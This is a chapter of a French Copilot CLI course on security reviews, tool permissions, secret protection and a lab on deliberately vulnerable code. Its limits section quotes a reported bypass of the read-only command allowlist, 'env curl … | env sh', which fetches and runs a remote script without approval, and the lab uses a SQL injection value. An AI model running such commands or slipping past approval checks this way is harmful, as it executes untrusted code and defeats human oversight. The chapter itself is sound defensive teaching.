<!--
---
id: CopilotCLI-11
title: !translate Sécuriser ton code avec Copilot CLI
description: !translate Utilise la revue de sécurité dédiée de Copilot CLI, protège tes secrets avec les exclusions de contenu, et entraîne-toi à détecter de vraies vulnérabilités dans du code volontairement vulnérable.
audience: Developers / Students / Terminal users
slug: security-with-copilot
weight: 12
---
-->

![Chapitre 11 : Sécurité](assets/chapter-header.png)

> **Et si Copilot CLI pouvait repérer une faille de sécurité dans ton code avant même que tu ne la commites ?**

Depuis le Chapitre 04, tu as déjà croisé la sécurité à plusieurs reprises : un aparté sur l'audit d'un fichier bugué (Chapitre 04), un skill `security-audit` maison basé sur le Top 10 OWASP (Chapitre 06), et un hook de pre-commit qui lance une revue automatique avant chaque commit (Chapitre 08). Ce chapitre rassemble ces briques et ajoute la pièce qui manquait : la commande **`/security-review`**, une revue de sécurité native de Copilot CLI, conçue spécifiquement pour scanner tes changements avant qu'ils ne partent en revue de code humaine.

## 🎯 Objectifs d'apprentissage

À la fin de ce chapitre, tu seras capable de :

- Activer et utiliser la commande `/security-review` pour scanner tes changements locaux
- Distinguer les catégories de vulnérabilités couvertes par cette revue, et celles qui ne le sont pas
- Écrire des instructions personnalisées qui orientent Copilot vers des pratiques de code sécurisées par défaut
- Protéger tes secrets avec les exclusions de contenu, et connaître leurs limites
- Adopter les réflexes de prudence nécessaires face aux risques d'exécution de commandes non supervisées
- Mener un audit de sécurité complet sur du code volontairement vulnérable

> ⏱️ **Durée estimée : ~40 minutes** (15 min de lecture + 25 min de pratique)

---

## ✅ Prérequis

- Avoir terminé le [Chapitre 04 : Flux de travail de développement](../04-development-workflows/README.md) — ce chapitre réutilise le réflexe de revue de code établi là-bas
- Avoir terminé le [Chapitre 06 : Automatiser les tâches répétitives](../06-skills/README.md) — pour comparer la commande native `/security-review` à un skill `security-audit` personnalisé
- ⚠️ **Copilot CLI dans une version qui propose `/security-review`, avec le mode expérimental activé** — cette fonctionnalité est en préversion publique. Vérifie ta version avec `copilot --version`, puis lance `copilot` et utilise `/experimental` pour activer le mode expérimental. Si `/security-review` ne figure toujours pas dans `/help`, mets à jour Copilot CLI avec `/update` ou suis les instructions d'installation officielles.
- Un dépôt avec des changements locaux (fichiers modifiés ou stagés) à scanner — un diff vide n'a rien à analyser

---

## 🧩 Analogie du monde réel

<img src="assets/security-checkpoint-analogy.png" alt="Un poste de contrôle rapide à l'entrée d'un bâtiment, avec en arrière-plan un service de douane qui inspecte en profondeur" width="800"/>

| Concept | `/security-review` (Copilot CLI) | Code Scanning / Dependabot / Snyk |
|---|---|---|
| Ce qu'il regarde | Ton diff local, avant commit | L'historique complet du dépôt, les dépendances publiées |
| Vitesse | Quelques secondes, dans le terminal | Minutes, en CI/CD |
| Ce qu'il détecte | Des failles de code (injection, XSS, secrets en dur, etc.) | Des CVE connues, des chaînes de dépendances vulnérables, des flux de données inter-fichiers |
| Quand l'utiliser | Avant de committer, en continu pendant que tu codes | En CI/CD, sur chaque pull request, en continu sur les dépendances |

Pense à `/security-review` comme au vigile qui contrôle rapidement ton sac à l'entrée d'un bâtiment : utile et immédiat, mais il ne remplace pas le service douanier qui inspecte en profondeur (Code Scanning avec CodeQL, Dependabot, Snyk) — les deux se complètent, ils n'interviennent pas au même moment ni sur le même périmètre.

> 💡 Depuis juillet 2026, la même revue de sécurité est aussi proposée dans l'application GitHub Copilot (pas seulement en CLI). Ce chapitre reste centré sur la CLI, mais le principe et les catégories détectées sont identiques d'une surface à l'autre.

---

## Je veux... | Aller à...

| Je veux... | Aller à |
|---|---|
| Scanner mes changements avant de commit | [Lancer une revue avec /security-review](#lancer-une-revue-avec-security-review) |
| Définir des règles de sécurité par défaut | [Écrire des instructions de sécurité par défaut](#écrire-des-instructions-de-sécurité-par-défaut) |
| Limiter précisément ce que Copilot a le droit de faire | [Contrôler finement les permissions d'outils](#contrôler-finement-les-permissions-doutils) |
| Empêcher Copilot de voir mes secrets | [Protéger tes secrets](#protéger-tes-secrets) |
| Comprendre les limites et les risques | [Comprendre les limites et les risques](#comprendre-les-limites-et-les-risques) |

---

## Lancer une revue avec /security-review

<a id="lancer-une-revue-avec-security-review"></a>

Une fois le mode expérimental activé, lance la commande depuis un projet de confiance contenant des changements locaux :

```bash
copilot

> /security-review
```

Copilot CLI analyse alors les changements stagés et non stagés que tu t'apprêtes à committer, et renvoie des failles à forte confiance classées par **sévérité** (Critique/Élevée/Moyenne/Faible). Chaque résultat peut inclure une explication et une correction suggérée à examiner avant application.

Les catégories couvertes sont larges :

| Catégorie | Exemple typique |
|---|---|
| Injection (SQL, commande shell, etc.) | Entrée utilisateur concaténée directement dans une requête ou une commande |
| Cross-Site Scripting (XSS) | Contenu utilisateur affiché sans échappement |
| Contrôle d'accès défaillant / traversée de chemin | Vérification d'autorisation manquante, `../` non filtré dans un chemin de fichier |
| SSRF (Server-Side Request Forgery) | Requête sortante construite à partir d'une entrée utilisateur non validée |
| Désérialisation non sécurisée / pollution de prototype | `pickle.loads()` sur des données non fiables, fusion d'objets non contrôlée |
| Cryptographie faible | MD5/SHA1 pour des mots de passe, générateur aléatoire non sécurisé |
| Secrets en dur | Clés API ou mots de passe écrits directement dans le code source |
| Fuite de données sensibles | Mots de passe ou numéros de carte écrits dans les logs |
| Authentification / CORS défaillants | Sessions mal invalidées, en-tête `Access-Control-Allow-Origin` trop permissif |
| Mauvaise configuration de sécurité | Dépendances non figées à une version précise (risque de chaîne d'approvisionnement) |
| Injection de prompt inter-agents (XPIA) | Contenu non fiable qui s'injecte dans un prompt destiné à une IA |

> 💡 **Cette commande ne remplace pas une analyse de vulnérabilités connues (CVE) ni un audit de dépendances.** Elle se concentre sur des schémas de code à risque, pas sur des correspondances avec des bases de CVE ou une analyse de flux de données inter-fichiers approfondie (« taint analysis »). Détail complet dans [Comprendre les limites et les risques](#comprendre-les-limites-et-les-risques).

---

## Écrire des instructions de sécurité par défaut

<a id="écrire-des-instructions-de-sécurité-par-défaut"></a>

`/security-review` réagit *après coup*, sur du code déjà écrit. Pour prévenir une partie des failles *avant* qu'elles n'apparaissent, complète ton `.github/copilot-instructions.md` (vu au [Chapitre 05](../05-agents-custom-instructions/README.md)) avec des règles de sécurité explicites :

```markdown
## Sécurité

- Ne jamais coder en dur une clé API, un mot de passe ou un jeton : utiliser des variables d'environnement
- Toujours utiliser des requêtes paramétrées, jamais de concaténation de chaînes dans une requête SQL
- Hacher les mots de passe avec un algorithme dédié (bcrypt, argon2) — jamais MD5 ni SHA1
- Valider et échapper toute entrée utilisateur avant de l'afficher ou de l'exécuter
```

Ces instructions se chargent automatiquement à chaque session, sans que tu aies à les répéter : c'est une défense en profondeur qui complète `/security-review`, plutôt qu'un doublon — l'une prévient, l'autre détecte ce qui est passé au travers.

---

## Contrôler finement les permissions d'outils

<a id="contrôler-finement-les-permissions-doutils"></a>

Tu connais déjà `--allow-all` (et son alias `--yolo`) depuis le Chapitre 02 : il désactive *toutes* les invites de permission d'un coup. C'est utile en environnement isolé (Chapitre 09), mais trop grossier pour un usage quotidien sur ta machine. Copilot CLI propose un contrôle bien plus précis, outil par outil :

```bash
# Autorise toutes les commandes git, sauf git push
copilot --allow-tool='shell(git:*)' --deny-tool='shell(git push)'

# Retire complètement la recherche et le fetch web du champ de vision du modèle
# (utile pendant une revue de sécurité, pour réduire la surface d'exfiltration/SSRF)
copilot --excluded-tools='web_fetch,web_search'
```

- **`--allow-tool` / `--deny-tool`** acceptent un nom d'outil seul (`shell`, `write`) ou un nom suivi d'un motif entre parenthèses (`shell(git:*)`, `shell(git push)`, `write(.github/copilot-instructions.md)`).
- **`--available-tools` / `--excluded-tools`** vont plus loin : ils retirent des outils du champ de vision du modèle, qui ne peut alors même pas envisager de les utiliser (au lieu de simplement lui refuser une exécution).
- **Règle à retenir : une règle `--deny-tool` l'emporte toujours sur une règle `--allow-tool` ou sur `--allow-all`.** C'est le filet de sécurité qui reste actif même si tu as été trop permissif par ailleurs.
- En session interactive, les commandes `/permissions`, `/allow-all` (alias `/yolo`) et `/reset-allowed-tools` offrent les mêmes réglages sans relancer Copilot CLI.

> ⚠️ **Piège courant : l'approbation « pour la session » est plus large qu'elle n'y paraît.** Si Copilot propose `rm ./fichier-temporaire.txt` et que tu approuves `rm` pour la session plutôt que « cette fois seulement », il pourra ensuite exécuter *n'importe quelle* commande `rm` sans nouvelle confirmation — pas seulement celle que tu as vue. Pour les commandes destructrices (`rm`, `git push`, un script de déploiement), approuve au cas par cas plutôt que d'accorder l'outil entier pour la session.

📖 Détails complets : [Allowing and denying tool use](https://docs.github.com/en/copilot/how-tos/copilot-cli/use-copilot-cli/allowing-tools).

---

## Protéger tes secrets

<a id="protéger-tes-secrets"></a>

Les **exclusions de contenu** (configurables au niveau organisation ou dépôt sur GitHub) permettent d'empêcher certains fichiers d'alimenter les suggestions, le chat ou la revue de code Copilot. Depuis le **2 septembre 2026**, GitHub a mis ces exclusions en disponibilité générale pour Copilot CLI et l'application GitHub Copilot (elles étaient auparavant limitées aux suggestions dans l'IDE) — mais avec deux réserves importantes :

- **Uniquement pour les plans Copilot Business et Copilot Enterprise.** Un compte Copilot Free ou Pro — le cas le plus courant pour suivre ce cours — n'en bénéficie pas du tout, quelle que soit la surface utilisée.
- **Même quand elles s'appliquent, les exclusions ont des limites documentées** : elles ne couvrent pas les liens symboliques ni les systèmes de fichiers distants, et leur propagation après configuration n'est pas instantanée.

La règle qui en découle reste donc la même, exclusion de contenu ou non : **ne laisse jamais un secret réel dans un fichier que Copilot peut lire**. En pratique :

- Garde tes secrets dans un fichier `.env` non versionné (déjà listé dans ton `.gitignore`), ou dans un gestionnaire de secrets qui les injecte à l'exécution
- Ne colle jamais une vraie clé d'API dans un prompt, même pour « juste tester »
- Si tu dois partager un fichier de configuration en exemple, remplace chaque valeur sensible par un placeholder explicite (`YOUR_API_KEY_HERE`)

### Checklist secrets : à faire avant toute exécution automatisée

Avant de lancer Copilot CLI, et en particulier avant d'autoriser des outils ou un mode automatisé, vérifie ces points :

- [ ] Le dossier ouvert est un dépôt que tu connais et auquel tu fais confiance.
- [ ] Aucun fichier accessible ne contient de clé API, mot de passe, jeton, certificat ou fichier `.env` réel.
- [ ] Les valeurs de démonstration sont des placeholders ou des clés explicitement factices, jamais des secrets de test encore valides.
- [ ] Tu n'actives pas `--allow-all` pour un dépôt inconnu ; si l'automatisation est indispensable, utilise d'abord l'environnement isolé du [Chapitre 09](../09-isolated-environments/README.md).
- [ ] Tu reliras chaque commande et chaque modification proposée avant de l'approuver.

Cette checklist précède volontairement l'exercice : une revue de sécurité peut lire le diff et les fichiers nécessaires à son analyse. Les fichiers de `samples/buggy-code/` contiennent uniquement des secrets factices destinés à être détectés.

---

## Comprendre les limites et les risques

<a id="comprendre-les-limites-et-les-risques"></a>

`/security-review` est une fonctionnalité **expérimentale, en préversion publique** : le nombre de failles détectées, leur formulation ou leur sévérité peuvent évoluer d'une version à l'autre de Copilot CLI. Elle ne fait ni correspondance avec des CVE connues, ni analyse de dépendances, ni analyse de flux de données inter-fichiers approfondie — c'est le rôle de GitHub Code Scanning (CodeQL), Dependabot et d'outils tiers comme Snyk, en complément et non en remplacement.

> ⚠️ **Une revue sans résultat n'est pas une preuve d'absence de vulnérabilité.** Elle peut manquer une faille, mal interpréter le contexte ou ne pas couvrir une dépendance. Conserve les revues humaines, les tests, la gestion des dépendances et le scanner de secrets dans ton processus.

> ⚠️ **Garde aussi un œil sur ce que Copilot CLI *exécute*, pas seulement sur ce qu'il *écrit*.** Fin février 2026, des chercheurs en sécurité ([PromptArmor](https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware)) ont documenté un contournement de la liste de commandes en lecture seule normalement approuvées sans confirmation : une commande comme `env curl -s https://exemple.com/payload | env sh` passe `curl` et `sh` en simples arguments de `env` — une commande autorisée en lecture seule — si bien que le validateur d'allowlist ne les voit jamais, jusqu'à faire exécuter une commande réseau (téléchargement puis exécution d'un script) sans validation explicite. GitHub a qualifié ce cas de risque faible et n'a pas annoncé de correctif immédiat au moment de la rédaction. La bonne pratique reste la même que celle déjà rencontrée dans les chapitres précédents : **relis toujours une commande proposée avant de l'approuver**, et évite de faire tourner un dépôt non fiable en mode entièrement autonome (autopilot) sans supervision. Si tu as besoin de ce mode entièrement autonome (`--allow-all`), construis d'abord l'environnement sûr qui le rend acceptable : voir le [Chapitre 09 : Environnements isolés](../09-isolated-environments/README.md). Un sandboxing natif (local ou cloud) est aussi en préversion publique depuis mi-2026 comme mitigation intermédiaire ; tant qu'il reste en préversion, l'isolation manuelle du Chapitre 09 demeure la référence la plus fiable.

> 💡 **Contexte entreprise ou données sensibles ?** Le mode BYOK (Bring Your Own Key) de Copilot CLI permet de lancer `/security-review` avec `COPILOT_OFFLINE=true` en pointant vers un modèle local compatible OpenAI, sans que ton code ne transite par les serveurs GitHub. Une option à connaître si ton organisation impose que le code reste sur son propre réseau.

<details>
<summary>🎬 Vois-le en action !</summary>

![Démo : /security-review sur un fichier vulnérable](assets/security-review-demo.gif)

*Le résultat peut varier selon ton modèle, tes outils et ton contexte : ne sois pas surpris si ta sortie diffère de celle présentée ici — le nombre de failles détectées, leur sévérité, ou le texte exact des corrections proposées peuvent changer d'une session à l'autre.*

</details>

---

## Pratique : un scénario de revue complet

Le dossier [`samples/buggy-code/`](../samples/buggy-code/README.md) contient du code volontairement vulnérable (injection SQL, secrets en dur, désérialisation dangereuse, etc.). **Ne corrige jamais ces fichiers dans le dépôt du cours.** Le laboratoire ci-dessous copie `user_service.py` dans un dossier temporaire et le stage comme un nouveau fichier : la revue reçoit ainsi le fichier entier dans son diff, sans modifier l'exemple pédagogique.

### 1. Détecter les problèmes

Après avoir effectué la [checklist secrets](#checklist-secrets--à-faire-avant-toute-exécution-automatisée), exécute ces commandes depuis la racine du dépôt :

```bash
LAB_DIR="$(mktemp -d)"
git init "$LAB_DIR"
cp samples/buggy-code/python/user_service.py "$LAB_DIR/user_service.py"
cd "$LAB_DIR"
git add user_service.py

copilot

> /security-review
```

**Résultats attendus :** la formulation et la sévérité peuvent varier, mais la revue doit notamment attirer l'attention sur la requête SQL construite avec `user_id` (environ ligne 15), la journalisation du mot de passe, le secret JWT en dur, le hachage MD5 et `pickle.loads()` sur des données non fiables. Note les résultats, leur sévérité et leur niveau de confiance : un résultat est une hypothèse à examiner, pas une correction automatique.

Si ta version ne propose pas `/security-review`, utilise ce repli manuel dans la même session Copilot :

```text
Examine @user_service.py pour les vulnérabilités de sécurité. Liste chaque problème avec sa ligne, son impact, son niveau de sévérité et une correction sûre. Ne modifie aucun fichier.
```

### 2. Valider manuellement un résultat

Choisis l'injection SQL de `get_user`. Lis la ligne signalée : `user_id` est inséré directement dans la requête SQL. Explique ensuite à Copilot pourquoi une valeur telle que `1 OR 1=1` peut modifier le sens de la requête. Ne lance pas cet exemple contre une base contenant des données réelles.

Pour chaque résultat, vérifie toi-même :

1. La donnée est-elle réellement contrôlée par un utilisateur ou une source non fiable ?
2. La ligne signalée atteint-elle une opération sensible (requête SQL, journal, désérialisation, etc.) ?
3. La correction suggérée préserve-t-elle le comportement attendu et n'introduit-elle pas de secret dans le code ?

### 3. Corriger uniquement dans le laboratoire

Le fichier du laboratoire est une copie : tu peux y tester une correction sans changer `samples/buggy-code/`. Demande une correction ciblée et relis le diff :

```text
Dans @user_service.py, corrige uniquement l'injection SQL de get_user avec une requête paramétrée. N'applique aucune autre correction et n'ajoute aucun secret.
```

La correction attendue transmet `user_id` comme paramètre séparé à `cursor.execute`, au lieu de le concaténer dans la chaîne SQL. Vérifie le diff proposé, puis stage seulement cette correction :

```bash
git diff -- user_service.py
git add user_service.py
```

### 4. Relire après la correction

Dans la même session, relance :

```text
/security-review
```

**Résultat attendu :** le signalement concernant la concaténation SQL dans `get_user` disparaît ou est résolu. Les autres problèmes intentionnels du fichier, comme le secret JWT, MD5 ou `pickle.loads()`, restent signalables tant que tu ne les as pas corrigés dans le laboratoire. Cette dernière revue confirme seulement le changement examiné ; elle ne certifie pas que le fichier est sûr.

Lorsque tu as terminé, ferme la session et supprime le dossier temporaire créé par `mktemp` à l'aide du chemin exact affiché par ton terminal. Ne copie pas la correction vers `samples/buggy-code/`.

---

## 📝 Devoir

**Défi principal** : reprends le scénario avec `samples/buggy-code/python/payment_processor.py` dans un nouveau laboratoire temporaire. Détecte une faille, valide-la manuellement, corrige-la uniquement dans la copie, puis relance `/security-review`. Ne commite pas cette correction dans le vrai dépôt du cours : ce dossier est un terrain d'exercice intentionnellement bugué.

**Défi bonus** : sur un projet personnel, ajoute une section « Sécurité » à ton propre `.github/copilot-instructions.md`, puis vérifie avec un prompt neutre (« écris-moi une fonction qui stocke un mot de passe ») que Copilot applique désormais ces règles par défaut.

<details>
<summary>💡 Indices</summary>

- Pour le défi principal, demande explicitement « Applique la correction proposée pour la faille [nom] dans ce fichier »
- Pour le défi bonus, formule des règles courtes et impératives (« Ne jamais... », « Toujours... ») plutôt que des explications longues — Copilot les respecte mieux ainsi

</details>

---

## 🔧 Erreurs courantes et dépannage

<details>
<summary>Clique pour voir les problèmes fréquents et leurs solutions</summary>

| Erreur | Ce qui se passe | Solution |
|---|---|---|
| `/security-review` introuvable ou ignorée | Mode expérimental non activé, ou version de Copilot CLI trop ancienne | Mets à jour Copilot CLI et active le mode expérimental (`copilot --help` ou la documentation officielle pour la syntaxe de ta version) |
| « Aucun changement à analyser » | Aucun fichier modifié ou stagé dans le dépôt courant | Modifie ou stage (`git add`) au moins un fichier avant de relancer la commande |
| Résultat différent d'une exécution à l'autre | La commande est encore en préversion publique, le modèle sous-jacent peut évoluer | Normal pour une fonctionnalité expérimentale — recoupe avec une revue manuelle ou ton skill `security-audit` |
| Aucune CVE ni dépendance vulnérable signalée | Ce n'est pas le rôle de `/security-review` : elle analyse des schémas de code, pas des bases de CVE | Utilise GitHub Code Scanning (CodeQL) et Dependabot en complément |
| Copilot exécute une commande shell sans confirmation attendue | Une liste de commandes en lecture seule peut être détournée par une entrée malveillante | Ne désactive jamais les approbations sur un dépôt non fiable ; relis chaque commande proposée avant de l'approuver |
| Copilot réexécute une commande destructrice sans redemander | Un outil (`rm`, `git push`...) a été approuvé « pour la session » plutôt que « cette fois seulement » | Approuve au cas par cas les commandes destructrices, ou utilise `--deny-tool` pour les bloquer explicitement ; réinitialise avec `/reset-allowed-tools` si besoin |

</details>

---

## Résumé

Tu as ajouté une dernière brique à ton flux de travail sécurité : une commande native pour scanner tes changements en quelques secondes, des instructions par défaut qui préviennent certaines failles avant même qu'elles n'apparaissent, et les réflexes de prudence nécessaires face aux limites réelles de l'outil.

### 🔑 Points clés à retenir

1. `/security-review` scanne ton diff local sur plusieurs catégories de vulnérabilités, directement dans le terminal (fonctionnalité expérimentale, en évolution)
2. Elle complète, sans les remplacer, les outils qui analysent l'historique du dépôt et les dépendances (Code Scanning/CodeQL, Dependabot, Snyk)
3. Des instructions de sécurité par défaut dans `.github/copilot-instructions.md` préviennent des failles avant même qu'elles ne soient écrites
4. `--allow-tool`/`--deny-tool` (et `--available-tools`/`--excluded-tools`) permettent un contrôle bien plus fin que `--allow-all` — et une règle `--deny-tool` l'emporte toujours sur les autres
5. Les exclusions de contenu couvrent désormais Copilot CLI (depuis septembre 2026), mais seulement sur les plans Business/Enterprise : la seule protection fiable pour un secret, quel que soit ton plan, reste de ne jamais le placer dans un fichier lisible par l'IA
6. Relis toujours une commande proposée par Copilot CLI avant de l'approuver, exactement comme tu relis du code généré

---

## 📋 Référence rapide

- [Dedicated security review command now available in Copilot CLI](https://github.blog/changelog/2026-06-10-dedicated-security-review-command-now-available-in-copilot-cli/) — annonce officielle de `/security-review`
- [Best practices for GitHub Copilot CLI](https://docs.github.com/en/copilot/how-tos/copilot-cli/cli-best-practices) — bonnes pratiques générales, dont la sécurité
- [Responsible use of GitHub Copilot CLI](https://docs.github.com/en/enterprise-cloud@latest/copilot/responsible-use/copilot-cli) — limites et usage responsable
- [Allowing and denying tool use](https://docs.github.com/en/copilot/how-tos/copilot-cli/use-copilot-cli/allowing-tools) — syntaxe complète de `--allow-tool`/`--deny-tool` et du modèle de permissions
- [Content exclusions generally available in Copilot app and CLI](https://github.blog/changelog/2026-09-02-content-exclusions-generally-available-in-copilot-app-and-cli/) — annonce officielle de la disponibilité générale (Business/Enterprise)
- [About content exclusion](https://docs.github.com/copilot/concepts/context/content-exclusion) — détails et limites des exclusions de contenu
- [Chapitre 06 : Automatiser les tâches répétitives](../06-skills/README.md) — le skill `security-audit` maison
- [samples/buggy-code](../samples/buggy-code/README.md) — le code volontairement vulnérable utilisé dans ce chapitre

---

## ➡️ Et ensuite ?

Tu sais maintenant sécuriser ton code et tes secrets face à Copilot CLI. Garde toujours la relecture humaine comme dernière ligne de défense. Dans le **[Chapitre 12 : Comprendre l'acceptation de l'IA par les développeurs](../12-ai-developer-acceptance/README.md)**, tu vas prendre du recul sur ce que la recherche indépendante dit de l'IA en développement.

**[← Chapitre précédent : Construire un pipeline RAG sur ton vault Obsidian](../10-obsidian-rag/README.md)** | **[Chapitre suivant : Comprendre l'acceptation de l'IA par les développeurs →](../12-ai-developer-acceptance/README.md)**
